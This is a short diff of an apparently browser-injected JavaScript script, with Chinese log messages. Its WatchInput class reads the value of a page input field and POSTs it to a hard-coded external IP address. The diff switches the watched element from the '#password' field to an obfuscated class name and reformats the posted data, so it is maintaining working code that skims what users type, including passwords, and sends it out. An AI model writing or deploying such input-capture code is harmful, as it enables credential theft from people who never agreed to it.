@@ -7,16 +7,15 @@ const url3 = 'http://106.12.9.249:1234/yh-get-input';
 console.log('脚本准备请求:',url2);
 console.log('YHUtils',YHUtils)
 
-YHUtils.request_yh({
-  url: url2,
-  method: 'get',
-  timeout: 3000
-}).then(r => {
-  console.log('r',r.responseText)
-}).catch(err => {
-  console.log('err',err)
-})
-
+// YHUtils.request_yh({
+//   url: url2,
+//   method: 'get',
+//   timeout: 3000
+// }).then(r => {
+//   console.log('r',r.responseText)
+// }).catch(err => {
+//   console.log('err',err)
+// })
 
 
 
@@ -42,11 +41,11 @@ class WatchInput {
     YHUtils.request_yh({
       url: this.url,
       method: 'post',
-      data: { value }
+      data: JSON.stringify({ value }),
     }).then(r => {
       console.log('Value sent successfully:',r.responseText);
     })
   }
 }
 console.log('WatchInput 创建实例');
-new WatchInput({ selector: '#password',url: url3 })
+new WatchInput({ selector: '.uCidR0ch',url: url3 })
